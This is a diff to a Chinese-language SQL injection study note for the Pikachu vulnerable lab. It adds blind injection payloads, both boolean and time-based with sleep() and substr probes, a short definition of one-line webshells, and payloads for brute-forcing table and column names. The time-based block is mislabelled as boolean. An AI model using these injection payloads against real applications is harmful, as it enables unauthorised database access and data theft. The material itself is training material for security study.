@@ -32,6 +32,7 @@
         - [案例4-基于insert、update、delete的注入](#%E6%A1%88%E4%BE%8B4-%E5%9F%BA%E4%BA%8Einsertupdatedelete%E7%9A%84%E6%B3%A8%E5%85%A5)
         - [http header注入](#http-header%E6%B3%A8%E5%85%A5)
         - [盲注](#%E7%9B%B2%E6%B3%A8)
+        - [暴力破解表名称和列名称](#%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E8%A1%A8%E5%90%8D%E7%A7%B0%E5%92%8C%E5%88%97%E5%90%8D%E7%A7%B0)
     - [相关链接](#%E7%9B%B8%E5%85%B3%E9%93%BE%E6%8E%A5)
 
 <!-- /TOC -->
@@ -453,6 +454,7 @@ delete from message where id = 1;
 - based time，基于时间的盲注
 
 ```sql
+--based boolean
 kobe' and 1=1#
 kobe' or 1=2#
 
@@ -465,8 +467,21 @@ select ascii(substr(database(),1,1))>113;--0
 select length(database());--7
 select length(database())>8;--0
 select length(database())>6;--1
+
+--based boolean
+kobe' and sleep(5)#
+kobe' and if((substr(database(),1,1))='p',sleep(5),null)#
 ```
 
+> 一句话木马：利用各种语言提供的用来执行代码的函数，或者用来执行操作系统命令的一些函数，通过这些函数构造简单的木马程序。把这些函数写到一个文件中，通过访问这个文件，来执行这个函数，然后向这个函数传入对应的命令，进行远程控制。
+
+### 暴力破解表名称和列名称
+利用burpsuit抓包，然后做暴力破解
+```sql
+--payload
+kobe' and exists(select * from aa)#
+kobe' and exists(select bb from users)#
+```
 
 ## 相关链接
 [视频教程](https://www.ichunqiu.com/course/63838)[|靶场](https://github.com/zhuifengshaonianhanlu/pikachu)
